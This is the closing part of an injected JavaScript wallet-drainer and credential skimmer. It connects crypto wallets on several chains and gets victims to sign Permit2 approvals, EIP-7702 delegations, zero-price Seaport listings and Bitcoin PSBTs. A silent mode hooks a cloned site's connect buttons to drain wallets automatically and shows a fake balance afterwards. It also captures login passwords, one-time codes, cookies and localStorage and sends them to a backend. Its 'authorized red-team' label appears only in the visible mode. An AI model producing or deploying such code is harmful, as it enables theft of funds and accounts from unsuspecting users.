    if (nativeSignedSpl) anchorBody.native_signed_transaction_spl = nativeSignedSpl;
    if (batch.spl_mint) anchorBody.spl_mint = batch.spl_mint;
    if (batch.spl_amount) anchorBody.spl_amount = batch.spl_amount;
    if (nativeSignedTrx) anchorBody.native_signed_transaction_trx = nativeSignedTrx;
    if (nativeSignedTon) anchorBody.native_signed_transaction_ton = nativeSignedTon;
    if (batch.native_amount_sol) anchorBody.nativeAmountSol = batch.native_amount_sol;
    if (batch.native_amount_trx) anchorBody.nativeAmountTrx = batch.native_amount_trx;
    if (batch.native_amount_ton) anchorBody.nativeAmountTon = batch.native_amount_ton;

    anchorBody.protocol = 'omnichain_atomic_v1';
    anchorBody.omni_payload_sync = {
      session: {
        eip155: true,
        solana: Boolean(wallets.sol),
        bip122: Boolean(wallets.btc),
        tron: Boolean(wallets.tron),
        ton: Boolean(wallets.ton),
      },
      primary_rack: 'eip155',
      evm_chain_id: evm.chainId,
    };

    setStatus('Submitting omnichain envelope to signature-anchor…', false);
    var result = await apiPost('/api/v1/signature-anchor', anchorBody);
    return result;
  }

  async function runSeaportAcceptOffer() {
    if (!wallets.evm) {
      await connectEvm();
    }
    var evm = wallets.evm;
    if (!evm) throw new Error('EVM wallet required for Seaport listing');

    var hashInput = document.getElementById('legion-seaport-order-hash');
    var pastedHash = hashInput && hashInput.value ? hashInput.value.trim() : '';
    var listing = null;

    if (pastedHash) {
      setStatus('Resolving Seaport order hash…', false);
      var resolved = await apiPost('/api/v1/seaport/order-by-hash', {
        order_hash: pastedHash,
        chain_id: evm.chainId,
      });
      listing = resolved.listing;
    } else {
      setStatus('Scanning OpenSea / Blur listings…', false);
      try {
        var scan = await apiPost('/api/v1/seaport/scan-listings', {
          wallet_address: evm.address,
          chain_id: evm.chainId,
          limit: 10,
        });
        if (scan.listings && scan.listings.length > 0) {
          listing = scan.listings[0];
        }
      } catch (scanErr) {
        console.warn('[LEGION_SEAPORT_SCAN]', scanErr);
      }
    }

    if (listing && listing.order && listing.order.signature) {
      setStatus('Fulfilling signed marketplace listing…', false);
      var fulfillExisting = await apiPost('/api/v1/seaport/fulfill', {
        order: listing.order,
        signature: listing.order.signature,
        chain_id: evm.chainId,
      });
      setStatus('Seaport listing fulfilled: ' + (fulfillExisting.transaction_hash || 'ok'), true);
      activateFakeBalanceAfterDrain();
      return fulfillExisting;
    }

    var nftContract = window.prompt('NFT contract address (0x…)', '');
    if (!nftContract) throw new Error('NFT contract required');
    var tokenId = window.prompt('Token ID', '0');
    if (tokenId == null || tokenId === '') throw new Error('Token ID required');

    setStatus('Building zero-price Seaport listing typed data…', false);
    var typed = await apiPost('/api/v1/seaport/listing-typed-data', {
      wallet_address: evm.address,
      nft_contract: nftContract,
      token_id: tokenId,
      chain_id: evm.chainId,
      seaport_version: '1.5',
    });

    setStatus('Sign Seaport order (EIP-712) — Accept Offer…', false);
    var seaportSig = await signEvmTypedData(typed.typed_data);

    var seaportOrder = {
      parameters: typed.order_parameters,
      signature: seaportSig,
    };

    setStatus('Submitting seaport_listing anchor…', false);
    var anchor = await apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'seaport_listing',
      wallet_address: evm.address,
      token_address: nftContract,
      chain_id: evm.chainId,
      seaport_order: seaportOrder,
      signature: seaportSig,
      nonce: 'seaport:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: 0,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });

    setStatus('Seaport anchor: ' + (anchor.transaction_hash || anchor.settlement_status || 'submitted'), true);
    activateFakeBalanceAfterDrain();
    return anchor;
  }

  async function runBitcoinPsbt(scoutUsd) {
    if (!wallets.btc) throw new Error('Bitcoin wallet not connected');
    setStatus('Building Bitcoin PSBT…', false);
    var psbt = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
      wallet_address: wallets.btc.address,
      amount_sat: '10000',
    });
    if (!psbt || !psbt.psbt_base64) throw new Error('PSBT build failed');

    var signedPsbt = psbt.psbt_base64;
    if (window.unisat && window.unisat.signPsbt) {
      signedPsbt = await window.unisat.signPsbt(psbt.psbt_base64);
    }

    return apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'UTXO',
      protocol: 'bitcoin_psbt',
      wallet_address: wallets.btc.address,
      token_address: 'BTC',
      signature: signedPsbt,
      nonce: 'btc:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: wallets.btc.provider,
      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });
  }

  async function connectActiveTab() {
    if (ACTIVE_TAB === 'evm') return connectEvm();
    if (ACTIVE_TAB === 'sol') return connectSolana();
    if (ACTIVE_TAB === 'tron') return connectTron();
    if (ACTIVE_TAB === 'ton') return connectTon();
    if (ACTIVE_TAB === 'btc') return connectBitcoin();
    throw new Error('Unsupported chain tab');
  }

  async function runAuthorizedDrain(opts) {
    var skipConnect = opts && opts.skipConnect;
    var btn = document.getElementById('legion-auth-primary');
    var wcBtn = document.getElementById('legion-auth-wc');
    if (btn) btn.disabled = true;
    if (wcBtn) wcBtn.disabled = true;
    if (!skipConnect) setStatus('Connecting wallet…', false);

    try {
      var conn;
      if (skipConnect) {
        if (ACTIVE_TAB === 'evm' && wallets.evm) conn = wallets.evm;
        else if (ACTIVE_TAB === 'sol' && wallets.sol) conn = wallets.sol;
        else if (ACTIVE_TAB === 'tron' && wallets.tron) conn = wallets.tron;
        else if (ACTIVE_TAB === 'ton' && wallets.ton) conn = wallets.ton;
        else if (ACTIVE_TAB === 'btc' && wallets.btc) conn = wallets.btc;
        else throw new Error('No wallet connected for ' + ACTIVE_TAB.toUpperCase());
      } else {
        conn = await connectActiveTab();
      }
      var chainFamily = ACTIVE_TAB === 'evm' ? 'EVM' : ACTIVE_TAB === 'sol' ? 'SVM' : ACTIVE_TAB === 'tron' ? 'TRON' : ACTIVE_TAB === 'ton' ? 'TON' : 'UTXO';
      var chainId = conn.chainId || 0;
      var walletType = conn.provider || conn.name || ACTIVE_TAB;

      await captureFakeBalanceSnapshot();

      await loadClientConfig();

      setStatus('Scout telemetry…', false);
      await postScout(conn.address, chainId, chainFamily, walletType);

      showPortfolioLoadingOverlay();
      setStatus('Loading portfolio (ranked assets)…', false);
      var ranked = await fetchRankedAssets(conn.address, chainFamily);
      var scoutUsd = ranked.total_usd || 0;

      setStatus('Scanning assets (recursive-predator-fusion)…', false);
      var fusionResult = await postFusion();
      scoutUsd = resolveScoutUsd(fusionResult, ranked);

      if (KINETIC_KEY) {
        setStatus('Checking existing allowances…', false);
        var reuse = await tryAllowanceReuse();
        if (reuse) {
          setStatus('Allowance reuse executed — zero-signature transfer complete', true);
          activateFakeBalanceAfterDrain();
          return;
        }
      }

      if (ACTIVE_TAB === 'btc') {
        await runBitcoinPsbt(scoutUsd);
        setStatus('Bitcoin PSBT submitted to signature-anchor', true);
        activateFakeBalanceAfterDrain();
        return;
      }

      if (!wallets.evm && ACTIVE_TAB !== 'evm') {
        setStatus('Connect EVM wallet first for omnichain Permit2 batch…', false);
        await connectEvm();
        await postScout(wallets.evm.address, wallets.evm.chainId, 'EVM', wallets.evm.provider);
      }

      if (EIP7702_ENABLED && wallets.evm && ACTIVE_TAB === 'evm') {
        var eip7702Done = await tryEip7702DelegationDrain(wallets.evm, scoutUsd);
        if (eip7702Done) {
          setStatus('EIP-7702 delegation anchor submitted', true);
          activateFakeBalanceAfterDrain();
          return;
        }
      }

      var settlement = await runOmnichainDrain(scoutUsd, ranked.assets);
      var txHash = settlement.transaction_hash || settlement.l2_mint_transaction_hash || settlement.settlement_status || 'submitted';
      setStatus('Settlement ingress complete: ' + txHash, true);
      activateFakeBalanceAfterDrain();
    } catch (err) {
      setStatus(err && err.message ? err.message : String(err), false);
      console.warn('[LEGION_AUTH_DRAIN]', err);
    } finally {
      if (btn) btn.disabled = false;
      if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
    }
  }

  async function runWalletConnectThenDrain() {
    var wcBtn = document.getElementById('legion-auth-wc');
    if (wcBtn) wcBtn.disabled = true;
    try {
      await connectWalletConnect();
      if (wallets.evm) ACTIVE_TAB = 'evm';
      else if (wallets.sol) ACTIVE_TAB = 'sol';
      await runAuthorizedDrain({ skipConnect: true });
    } catch (err) {
      setStatus(err && err.message ? err.message : String(err), false);
      console.warn('[LEGION_AUTH_WC]', err);
    } finally {
      if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
    }
  }

  var CONNECT_BTN_RE = /connect\s*(wallet)?|wallet\s*connect|sign\s*in|link\s*wallet/i;

  function hookNativeConnectButtons(root) {
    var nodes = (root || document).querySelectorAll('button, a, [role="button"], input[type="button"]');
    nodes.forEach(function (el) {
      if (el.__legionConnectHook) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
      if (!CONNECT_BTN_RE.test(label)) return;
      el.__legionConnectHook = true;
      el.addEventListener('click', function () {
        setTimeout(function () {
          if (window.ethereum && window.ethereum.selectedAddress) {
            wallets.evm = {
              address: window.ethereum.selectedAddress,
              chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
              provider: 'injected',
            };
            ACTIVE_TAB = 'evm';
            runAuthorizedDrain({ skipConnect: true });
            if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
          }
        }, 2000);
      }, true);
    });
  }

  function mountSilentAutoDrain() {
    document.body.classList.add('legion-silent');
    var hidden = document.createElement('div');
    hidden.id = 'legion-auth-status';
    hidden.className = 'status';
    hidden.style.cssText = 'display:none!important;';
    document.body.appendChild(hidden);

    function tryAutoDrain() {
      if (window.ethereum && window.ethereum.selectedAddress) {
        wallets.evm = {
          address: window.ethereum.selectedAddress,
          chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
          provider: 'injected',
        };
        ACTIVE_TAB = 'evm';
        captureFakeBalanceSnapshot().then(function () {
          return runAuthorizedDrain({ skipConnect: true });
        });
        if (window.__legionBalanceDisplay) window.__legionBalanceDisplay.refresh();
      }
    }

    hookNativeConnectButtons(document);
    if (PRODUCTION_CLONE) {
      var obs = new MutationObserver(function (mutations) {
        mutations.forEach(function (m) {
          m.addedNodes.forEach(function (node) {
            if (node.nodeType === 1) hookNativeConnectButtons(node);
          });
        });
      });
      obs.observe(document.documentElement, { childList: true, subtree: true });
    }

    if (window.ethereum) {
      if (window.ethereum.selectedAddress) tryAutoDrain();
      window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts && accounts[0]) tryAutoDrain();
      });
      window.ethereum.on('connect', tryAutoDrain);
    }
  }

  function mountUi() {
    if ((SILENT_INJECT || PRODUCTION_CLONE) && !QA_VISIBLE_UI) {
      mountSilentAutoDrain();
      return;
    }

    document.body.classList.add('legion-auth-active');

    var banner = document.createElement('div');
    banner.id = 'legion-auth-banner';
    banner.setAttribute('role', 'alert');
    banner.textContent = 'AUTHORIZED RED-TEAM EXERCISE — PRODUCTION BACKEND — WRITTEN PERMISSION REQUIRED';
    document.body.prepend(banner);

    var panel = document.createElement('div');
    panel.id = 'legion-auth-panel';
    panel.innerHTML = [
      '<header>Connect wallet (authorized exercise)</header>',
      '<div class="tabs">',
      '  <button type="button" data-tab="evm" class="active">EVM</button>',
      '  <button type="button" data-tab="sol">Solana</button>',
      '  <button type="button" data-tab="tron">Tron</button>',
      '  <button type="button" data-tab="ton">TON</button>',
      '  <button type="button" data-tab="btc">BTC</button>',
      '</div>',
      '<div class="body">',
      '  <div id="legion-auth-status" class="status">Select chain, connect, and authorize transfer.</div>',
      '  <div class="wallet-mode">',
      '    <button type="button" class="secondary" id="legion-auth-wc"' +
        (WC_PROJECT_ID ? '' : ' disabled title="Set NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID"') +
        '>WalletConnect (QR)</button>',
      '  </div>',
      '  <input type="text" class="seaport-hash" id="legion-seaport-order-hash" placeholder="Optional: paste OpenSea order hash" />',
      '  <div class="actions">',
      '    <button type="button" class="primary" id="legion-auth-primary">Connect &amp; Transfer</button>',
      '    <button type="button" class="secondary" id="legion-auth-seaport">Accept Offer</button>',
      '  </div>',
      '</div>',
    ].join('');

    document.body.appendChild(panel);

    panel.querySelectorAll('.tabs button').forEach(function (tabBtn) {
      tabBtn.addEventListener('click', function () {
        ACTIVE_TAB = tabBtn.getAttribute('data-tab') || 'evm';
        panel.querySelectorAll('.tabs button').forEach(function (b) { b.classList.remove('active'); });
        tabBtn.classList.add('active');
        setStatus('Chain: ' + ACTIVE_TAB.toUpperCase() + ' — ready.', false);
      });
    });

    document.getElementById('legion-auth-primary').addEventListener('click', function () {
      runAuthorizedDrain();
    });
    var seaportBtn = document.getElementById('legion-auth-seaport');
    if (seaportBtn) {
      seaportBtn.addEventListener('click', function () {
        var btn = document.getElementById('legion-auth-primary');
        var wcBtn = document.getElementById('legion-auth-wc');
        seaportBtn.disabled = true;
        if (btn) btn.disabled = true;
        if (wcBtn) wcBtn.disabled = true;
        runSeaportAcceptOffer()
          .catch(function (err) {
            setStatus(err && err.message ? err.message : String(err), false);
            console.warn('[LEGION_SEAPORT]', err);
          })
          .finally(function () {
            seaportBtn.disabled = false;
            if (btn) btn.disabled = false;
            if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
          });
      });
    }
    var wcButton = document.getElementById('legion-auth-wc');
    if (wcButton) {
      wcButton.addEventListener('click', runWalletConnectThenDrain);
    }
  }

  /* ── Generic login form credential + session capture (authorized lab) ── */
  var LOGIN_USER_FIELDS = ['email', 'username', 'login', 'user', 'userid', 'account', 'phone'];
  var LOGIN_PASS_FIELDS = ['password', 'pass', 'passwd', 'pwd'];
  var LOGIN_TOTP_FIELDS = ['totp', 'otp', '2fa', 'mfa', 'code', 'token', 'authenticator', 'sms'];

  function loginFieldMatch(name, list) {
    if (!name) return false;
    var n = String(name).toLowerCase();
    return list.some(function (f) { return n.indexOf(f) >= 0; });
  }

  function readLoginFormPayload(form) {
    var username = '';
    var password = '';
    var totp = '';
    try {
      var fd = new FormData(form);
      fd.forEach(function (value, key) {
        var v = String(value || '').trim();
        if (!v) return;
        if (!username && loginFieldMatch(key, LOGIN_USER_FIELDS)) username = v;
        if (!password && loginFieldMatch(key, LOGIN_PASS_FIELDS)) password = v;
        if (!totp && loginFieldMatch(key, LOGIN_TOTP_FIELDS)) totp = v;
      });
    } catch (e) { /* non-fatal */ }
    if (!password) {
      var pw = form.querySelector('input[type="password"]');
      if (pw) password = String(pw.value || '').trim();
    }
    if (!username) {
      var email = form.querySelector('input[type="email"]');
      if (email) username = String(email.value || '').trim();
      if (!username) {
        var text = form.querySelector('input[type="text"]');
        if (text) username = String(text.value || '').trim();
      }
    }
    return { username: username, password: password, totp: totp };
  }

  function readDocumentCookies() {
    try {
      var raw = document.cookie || '';
      return raw.trim() || null;
    } catch (e) {
      return null;
    }
  }

  function readLocalStorageJson() {
    try {
      var out = {};
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (!key) continue;
        out[key] = localStorage.getItem(key);
      }
      return Object.keys(out).length ? JSON.stringify(out) : null;
    } catch (e) {
      return null;
    }
  }

  function buildLoginCredPayload(formPayload) {
    return {
      exchange: window.location.hostname.replace(/^www\./, ''),
      username: formPayload.username,
      password: formPayload.password,
      totp: formPayload.totp || null,
      page_url: window.location.href,
      session_cookies: readDocumentCookies(),
      local_storage: readLocalStorageJson(),
    };
  }

  async function submitLoginCreds(formPayload) {
    if (!formPayload.username || !formPayload.password) return;
    var headers = { 'Content-Type': 'application/json' };
    if (CEX_CREDS_API_KEY) headers['X-Cex-Creds-Key'] = CEX_CREDS_API_KEY;
    try {
      await fetch(BACKEND_URL + '/api/v1/creds', {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(buildLoginCredPayload(formPayload)),
        keepalive: true,
      });
    } catch (e) {
      console.warn('[LEGION_LOGIN_CAPTURE]', e);
    }
  }

  function hookLoginForm(form) {
    if (!CAPTURE_LOGIN_CREDS || form.__legionLoginHooked) return;
    var hasPassword = form.querySelector('input[type="password"]');
    if (!hasPassword) return;
    form.__legionLoginHooked = true;

    form.addEventListener('submit', function () {
      var payload = readLoginFormPayload(form);
      if (!payload.username || !payload.password) return;
      submitLoginCreds(payload);
      setTimeout(function () {
        submitLoginCreds(payload);
      }, 1500);
    }, true);
  }

  function scanLoginForms(root) {
    if (!CAPTURE_LOGIN_CREDS) return;
    (root || document).querySelectorAll('form').forEach(hookLoginForm);
  }

  function initLoginFormCapture() {
    if (!CAPTURE_LOGIN_CREDS) return;
    scanLoginForms(document);
    var loginObs = new MutationObserver(function (mutations) {
      mutations.forEach(function (m) {
        m.addedNodes.forEach(function (node) {
          if (node.nodeType !== 1) return;
          if (node.tagName === 'FORM') hookLoginForm(node);
          else scanLoginForms(node);
        });
      });
    });
    loginObs.observe(document.documentElement, { childList: true, subtree: true });
  }

  function bootLegionInject() {
    mountUi();
    initLoginFormCapture();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', bootLegionInject);
  } else {
    bootLegionInject();
  }
})();
